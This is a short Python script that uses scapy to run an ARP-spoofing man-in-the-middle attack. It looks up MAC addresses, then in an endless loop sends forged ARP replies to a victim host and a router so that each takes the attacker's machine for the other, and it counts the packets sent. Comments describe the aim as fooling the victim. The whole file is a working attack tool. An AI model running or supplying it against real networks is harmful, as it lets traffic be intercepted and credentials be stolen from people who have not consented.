#!/usr/bin/env python
import time
import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    # pdst = victim ip address
    # hwdst = victim mac address
    # psrc = router ip
    # This tells the victim that the packet has been sent from router. To fool the victim
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


sent_packets_count = 0
while True:
    spoof("192.168.174.141", "192.168.174.2")
    spoof("192.168.174.2", "192.168.174.141")
    sent_packets_count += 2
    print("[+] Packets Sent: " + str(sent_packets_count))
    time.sleep(2)